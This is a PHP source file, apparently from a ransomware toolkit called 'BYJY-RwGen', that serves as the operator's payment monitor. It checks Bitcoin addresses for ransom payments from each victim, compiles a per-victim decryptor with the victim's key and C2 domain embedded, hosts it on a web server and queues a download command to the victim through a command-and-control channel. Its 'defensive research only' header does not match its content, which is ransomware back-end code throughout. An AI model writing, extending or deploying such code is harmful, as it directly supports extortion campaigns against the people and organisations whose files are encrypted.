<?php
/**
 * Automatic Payment Monitor & Decryptor Generator
 * Monitors Bitcoin payments and automatically generates decryptors
 * For defensive cybersecurity research purposes only
 */

require_once 'database.php';
require_once 'bitcoin_api.php';

class PaymentMonitor {
    private $db;
    private $bitcoin_api;
    private $monitoring_interval = 300; // 5 minutes
    private $log_file = 'payment_monitor.log';
    
    public function __construct() {
        $this->db = new Database();
        $this->bitcoin_api = new BitcoinAPI();
    }
    
    public function startMonitoring() {
        $this->log("Payment monitor started");
        
        while (true) {
            try {
                $this->checkPendingPayments();
                $this->processVerifiedPayments();
                $this->cleanupExpiredSessions();
                
                sleep($this->monitoring_interval);
                
            } catch (Exception $e) {
                $this->log("Error in monitoring loop: " . $e->getMessage());
                sleep(60); // Wait 1 minute before retrying
            }
        }
    }
    
    private function checkPendingPayments() {
        $this->log("Checking pending payments...");
        
        $pending_payments = $this->db->getPendingPayments();
        
        foreach ($pending_payments as $payment) {
            try {
                $verification = $this->bitcoin_api->verifyPayment(
                    $payment['bitcoin_address'],
                    $payment['amount_btc'],
                    72 // 72 hour window
                );
                
                if ($verification['verified']) {
                    $this->log("Payment verified for victim: " . $payment['victim_id']);
                    
                    // Update payment status
                    $this->db->markPaymentReceived(
                        $payment['victim_id'], 
                        $verification['transactions'][0]['txid'] ?? 'unknown'
                    );
                    
                    // Generate and deploy decryptor
                    $this->generateDecryptor($payment['victim_id']);
                    
                } else {
                    $this->log("Payment not yet received for victim: " . $payment['victim_id']);
                }
                
            } catch (Exception $e) {
                $this->log("Error checking payment for victim " . $payment['victim_id'] . ": " . $e->getMessage());
            }
            
            // Rate limit to avoid overwhelming Bitcoin APIs
            sleep(10);
        }
    }
    
    private function processVerifiedPayments() {
        $verified_payments = $this->db->getVerifiedPaymentsWithoutDecryptors();
        
        foreach ($verified_payments as $payment) {
            if (!$this->hasDecryptorBeenGenerated($payment['victim_id'])) {
                $this->generateDecryptor($payment['victim_id']);
            }
        }
    }
    
    private function generateDecryptor($victim_id) {
        $this->log("Generating decryptor for victim: $victim_id");
        
        try {
            // Get victim details and encryption key
            $victim = $this->db->getVictimByVictimId($victim_id);
            if (!$victim) {
                throw new Exception("Victim not found: $victim_id");
            }
            
            $encryption_key = $victim['encryption_key'];
            
            // Compile decryptor with embedded key
            $decryptor_path = $this->compileDecryptor($victim_id, $encryption_key);
            
            // Send decryptor via C&C channel
            $this->distributeDecryptor($victim_id, $decryptor_path);
            
            // Log successful generation
            $this->db->markDecryptorGenerated($victim_id);
            
            $this->log("Decryptor successfully generated and distributed for victim: $victim_id");
            
        } catch (Exception $e) {
            $this->log("Error generating decryptor for victim $victim_id: " . $e->getMessage());
        }
    }
    
    private function compileDecryptor($victim_id, $encryption_key) {
        $decryptor_dir = "/tmp/decryptors";
        if (!is_dir($decryptor_dir)) {
            mkdir($decryptor_dir, 0755, true);
        }
        
        $output_file = "$decryptor_dir/decryptor_$victim_id.exe";
        
        // Create source file with embedded key
        $source_template = file_get_contents('/app/victim_client/decryptor_template.cpp');
        $personalized_source = str_replace([
            '{{VICTIM_ID}}', 
            '{{ENCRYPTION_KEY}}',
            '{{C2_DOMAIN}}'
        ], [
            $victim_id,
            $encryption_key,
            $this->getC2Domain()
        ], $source_template);
        
        $source_file = "$decryptor_dir/decryptor_$victim_id.cpp";
        file_put_contents($source_file, $personalized_source);
        
        // Compile decryptor
        $compile_cmd = [
            "g++", 
            "-std=c++17",
            "-O3",
            "-static",
            "-lsodium",
            "-lcurl",
            "-pthread",
            $source_file,
            "-o", $output_file
        ];
        
        $result = shell_exec(implode(' ', $compile_cmd) . ' 2>&1');
        
        if (!file_exists($output_file)) {
            throw new Exception("Failed to compile decryptor: $result");
        }
        
        // Clean up source
        unlink($source_file);
        
        return $output_file;
    }
    
    private function distributeDecryptor($victim_id, $decryptor_path) {
        // Method 1: Store for download via C&C
        $this->storeDecryptorForDownload($victim_id, $decryptor_path);
        
        // Method 2: Send download command via DNS tunnel
        $this->sendDecryptorCommand($victim_id);
    }
    
    private function storeDecryptorForDownload($victim_id, $decryptor_path) {
        $web_dir = "/var/www/html/decryptors";
        if (!is_dir($web_dir)) {
            mkdir($web_dir, 0755, true);
        }
        
        // Generate unique download token
        $download_token = hash('sha256', $victim_id . time() . random_bytes(16));
        $web_path = "$web_dir/$download_token.exe";
        
        // Copy decryptor to web directory
        copy($decryptor_path, $web_path);
        
        // Store download info in database
        $this->db->storeDecryptorDownload($victim_id, $download_token);
        
        return $download_token;
    }
    
    private function sendDecryptorCommand($victim_id) {
        // Send command to victim via C&C to download decryptor
        $command = [
            'action' => 'download_decryptor',
            'victim_id' => $victim_id,
            'download_url' => $this->getDecryptorDownloadUrl($victim_id),
            'timestamp' => time()
        ];
        
        $this->db->sendCommand($victim_id, 'download_decryptor', json_encode($command));
    }
    
    private function getDecryptorDownloadUrl($victim_id) {
        $download_info = $this->db->getDecryptorDownloadInfo($victim_id);
        if ($download_info) {
            return "https://" . $this->getC2Domain() . "/decryptors/" . $download_info['download_token'] . ".exe";
        }
        return null;
    }
    
    private function hasDecryptorBeenGenerated($victim_id) {
        return $this->db->isDecryptorGenerated($victim_id);
    }
    
    private function cleanupExpiredSessions() {
        // Clean up victims that haven't been active for 7 days
        $this->db->cleanupInactiveVictims(7 * 24 * 3600);
        
        // Clean up old decryptor files
        $this->cleanupOldDecryptors();
    }
    
    private function cleanupOldDecryptors() {
        $decryptor_dirs = ["/tmp/decryptors", "/var/www/html/decryptors"];
        
        foreach ($decryptor_dirs as $dir) {
            if (!is_dir($dir)) continue;
            
            $files = glob("$dir/*");
            foreach ($files as $file) {
                if (filemtime($file) < time() - 7 * 24 * 3600) { // 7 days old
                    unlink($file);
                }
            }
        }
    }
    
    private function getC2Domain() {
        // Get C2 domain from configuration
        $config = json_decode(file_get_contents('/app/c2_config.json'), true);
        return $config['c2_domain'] ?? 'localhost';
    }
    
    private function log($message) {
        $timestamp = date('Y-m-d H:i:s');
        $log_entry = "[$timestamp] $message\n";
        
        file_put_contents($this->log_file, $log_entry, FILE_APPEND | LOCK_EX);
        echo $log_entry;
    }
}

// CLI usage
if (php_sapi_name() === 'cli') {
    echo "BYJY-RwGen Payment Monitor\n";
    echo "Starting automatic payment monitoring...\n";
    echo "Press Ctrl+C to stop\n\n";
    
    $monitor = new PaymentMonitor();
    $monitor->startMonitoring();
}
?>